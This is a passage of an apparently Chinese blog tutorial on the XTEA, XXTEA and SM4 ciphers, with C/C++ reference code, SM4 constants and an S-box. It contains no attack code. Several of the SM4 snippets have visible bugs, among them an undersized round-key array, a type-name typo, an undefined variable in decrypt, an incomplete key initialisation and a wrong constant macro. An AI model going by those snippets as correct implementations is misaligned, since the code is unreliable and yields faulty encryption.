delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相比tea，在使用密钥更不确定，特征值不变</p>
<h3 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h3><p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX ((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4) ^ (sum^y) + (k[p&amp;3^e]^z))</span></span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">long</span> <span class="title">btea</span><span class="params">(<span class="keyword">long</span>* v, <span class="keyword">long</span> n, <span class="keyword">long</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> z=v[n<span class="number">-1</span>], y=v[<span class="number">0</span>], sum=<span class="number">0</span>, e, DELTA=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">long</span> p, q ;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">      q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++) y = v[p+<span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span> ; </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">      n = -n;</span><br><span class="line">      q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      sum = q*DELTA ;</span><br><span class="line">      <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--) z = v[p<span class="number">-1</span>], y = v[p] -= MX;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>n表示v的长度，正数表示加密，负数解密</p>
<h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><ul>
<li><p>密钥长度为128bits</p>
</li>
<li><p>加密算法和密钥扩展算法都是32位非线性迭代结构</p>
</li>
<li><p>加解密算法结构相同，轮密钥的使用顺序相反</p>
</li>
</ul>
<h4 id="定义运算"><a href="#定义运算" class="headerlink" title="定义运算"></a>定义运算</h4><p>32位数$x$向左循环移动$i$位$:x&lt;&lt;&lt;i,\oplus$为异或</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)x&gt;&gt;(32-(i)))))</span></span></span><br></pre></td></tr></table></figure>

<h4 id="定义参量"><a href="#定义参量" class="headerlink" title="定义参量"></a>定义参量</h4><p>密钥长度位128bits $MK=(MK_0,MK_1,MK_2,MK_3)$</p>
<p>轮密钥为32*32bits $rk=(rk_0,rk_1,…,rk_{31})$</p>
<p>$FK=(FK_0,FK_1,…,FK_3)$为系统参数，$CK=(CK_0,CK_1,…,CK_{31})$为固定参数</p>
<p>$CK_{i,j}=(4i+j)*7\ mod\ 256$，其中$i$为双字编号，$j$为字节编号，$j$采用大端序</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RK_SIZE 32</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> mk[<span class="number">4</span>];    <span class="comment">// 加密使用的密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rk[<span class="number">31</span>];    <span class="comment">// 轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> fk[<span class="number">4</span>]=&#123;<span class="number">0xA3B1BAC6</span>,<span class="number">0x56AA3350</span>,<span class="number">0x677D9197</span>,<span class="number">0xB27022DC</span>&#125;;</span><br><span class="line"><span class="comment">// ck会在密钥生成算法中体现</span></span><br></pre></td></tr></table></figure>

<h4 id="轮函数F"><a href="#轮函数F" class="headerlink" title="轮函数F"></a>轮函数F</h4><p>$F(X_0,X_1,X_2,X_3,rk)=X_0\oplus T(X_1\oplus X_2\oplus X_3\oplus rk)$</p>
<p>合成置换$T(.)=L(\tau(.))$</p>
<p>若输入为$A=(a_0,a_1,a_2,a_3)$，其中$a_i$为8字节无符号整数，则非线性置换$\tau(A)=(sbox[a_0],sbox[a_1],sbox[a_2],sbox[a_3])$</p>
<p>$sbox$为替换用s盒</p>
<p>若输入为$B$，其中$B$为32字节无符号整数，则线性变换$L(B)=B\oplus (B&lt;&lt;&lt;2)\oplus(B&lt;&lt;&lt;10)\oplus(B&lt;&lt;&lt;18)\oplus(B&lt;&lt;&lt;24)$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) (x)^ROL32(x,2)^ROL32(x,10)^ROL32(x,18)^ROL32(x,24)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) (sbox[(x)&gt;&gt;24]<span class="meta-string">&lt;&lt;24|sbox[((x)&gt;&gt;16)&amp;0xFF]&lt;&lt;16|sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8|sbox[x&amp;0xFF])</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T(x) (L(tau(x)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> sbox[<span class="number">256</span>]; <span class="comment">// s盒，在最终代码中体现</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮函数F直接在加密过程中体现</span></span><br></pre></td></tr></table></figure>

<h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><p>反序变换$R(a_0,a_1,a_2,a_3)=(a_3,a_2,a_1,a_0),a_i$为8位</p>
<p>设输入为$(X_0,X_1,X_2,X_3),X_i$为32位</p>
<p>输出为$(Y_0,Y_1,Y_2,Y_3)$</p>
<p>则$X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i)$</p>
<p>$(Y_0,Y_1,Y_2,Y_3)=R(X_{32},X_{33},X_{34},X_{35})$</p>
<p>解密过程和加密过程变换结构相同，不同的是轮密钥顺序</p>
<p>加密时$(rk_0,rk_1,…,rk_{31})$</p>
<p>解密时$rk_{31},rk_{30},…,rk_0$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>],<span class="keyword">uint32_t</span> crk[<span class="number">31</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c[<span class="number">36</span>];</span><br><span class="line">    c[<span class="number">0</span>]=p[<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">1</span>]=p[<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">2</span>]=p[<span class="number">2</span>];</span><br><span class="line">    c[<span class="number">3</span>]=p[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;RK_SIZE;i++)&#123;</span><br><span class="line">        c[i+<span class="number">4</span>]=c[i]^T(c[i+<span class="number">1</span>]^c[i+<span class="number">2</span>]^c[i+<span class="number">3</span>]^crk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">0</span>]=c[<span class="number">35</span>];</span><br><span class="line">    p[<span class="number">1</span>]=c[<span class="number">34</span>];</span><br><span class="line">    p[<span class="number">2</span>]=c[<span class="number">33</span>];</span><br><span class="line">    p[<span class="number">3</span>]=c[<span class="number">32</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    crypt(p,rk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> c[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    crypt(p,rrk); <span class="comment">// rrk是rk的逆序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h4><p>密钥$MK=(MK_0,MK_1,MK_2,MK_3)$</p>
<p>$K=(K_0,K_1,…,K_{31})$</p>
<p>$(K_0,K_1,K_2,K_3)=(MK_0\oplus FK_0,MK_1\oplus FK_1,MK_2\oplus FK_2,MK_3\oplus FK_3)$</p>
<p>轮密钥为$rk,rk_i=K_{i+4}=K_i\oplus T’(K_{i+1}\oplus K_{i+2}\oplus K_{i+3}\oplus CK_i)$</p>
<p>$T’$和$T$基本相同，其中的$L’=B\oplus(B&lt;&lt;&lt;13)\oplus(B&lt;&lt;&lt;23)$</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Lp(x) ((x)^ROL32(x,13)^ROL32(x,23))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Tp(x) Lp(tau(x))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ck(i) (((4*(i)*7)&amp;0xFF)&lt;&lt;24|(((4*(i)+1)*7)&amp;0xFF)&lt;&lt;16|(((4*(i)+2)*7)&amp;0xFF)&lt;&lt;8|(4*(i)+3)&amp;0xFF)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initKey</span><span class="params">(<span class="keyword">uin32_t</span> mk[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">36</span>];</span><br><span class="line">    k[<span class="number">0</span>]=mk[<span class="number">0</span>]^fk[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;RK_SIZE;i++)&#123;</span><br><span class="line">        k[i+<span class="number">4</span>]=k[i]^Tp(k[i+<span class="number">1</span>]^k[i+<span class="number">2</span>]^k[i+<span class="number">3</span>]^ck(i));</span><br><span class="line">        rk[i]=k[i+<span class="number">4</span>];</span><br><span class="line">        rrk[RK_SIZE-i]=rk[i]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> cha(x) ((((x)&amp;0x3F)+24)%64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)(x)&gt;&gt;(32-(i)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) (x)^ROL32(x,2)^ROL32(x,10)^ROL32(x,18)^ROL32(x,24)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) (sbox[((x)&gt;&gt;24)&amp;0xFF]<span class="meta-string">&lt;&lt;24|sbox[((x)&gt;&gt;16)&amp;0xFF]&lt;&lt;16|sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8|sbox[x&amp;0xFF])</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T(x) (L(tau(x)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Lp(x) ((x)^ROL32(x,13)^ROL32(x,23)) <span class="comment">// L&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Tp(x) (Lp(tau(x))) <span class="comment">// T&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ck(i) (((4*(i)*7)&amp;0xFF)&lt;&lt;24|(((4*(i)+1)*7)&amp;0xFF)&lt;&lt;16|(((4*(i)+2)*7)&amp;0xFF)&lt;&lt;8|(4*(i)+3)*7&amp;0xFF)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R(x) (((x)&gt;&gt;24)&amp;0xFF|((x)&gt;&gt;8)&amp;0xFF00|((x)&lt;&lt;8)&amp;0xFF0000|((x)&lt;&lt;24))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RK_SIZE 32      <span class="comment">// 密钥轮数</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rk[<span class="number">32</span>];    <span class="comment">// 轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rrk[<span class="number">32</span>];    <span class="comment">// 逆序轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> fk[<span class="number">4</span>] = &#123; <span class="number">0xA3B1BAC6</span>,<span class="number">0x56AA3350</span>,<span class="number">0x677D9197</span>,<span class="number">0xB27022DC</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,</span><br><span class="line"><span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,</span><br><span class="line"><span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,</span><br><span class="line"><span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,</span><br><span class="line"><span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,</span><br><span class="line"><span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,</span><br><span class="line"><span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>], <span class="keyword">uint32_t</span> crk[<span class="number">31</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c[<span class="number">36</span>];</span><br><span class="line">    c[<span class="number">0</span>] = p[<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">1</span>] = p[<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">2</span>] = p[<span class="number">2</span>];</span><br><span class="line">    c[<span class="number">3</span>] = p[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; RK_SIZE; i++) &#123;</span><br><span class="line">        t = (c[i + <span class="number">1</span>] ^ c[i + <span class="number">2</span>] ^ c[i + <span class="number">3</span>] ^ crk[i]);</span><br><span class="line">        c[i + <span class="number">4</span>] = c[i] ^ T(t);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, c[i + <span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">0</span>] = c[<span class="number">35</span>];</span><br><span class="line">    p[<span class="number">1</span>] = c[<span class="number">34</span>];</span><br><span class="line">    p[<span class="number">2</span>] = c[<span class="number">33</span>];</span><br><span class="line">    p[<span class="number">3</span>] = c[<span class="number">32</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    crypt(p, rk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 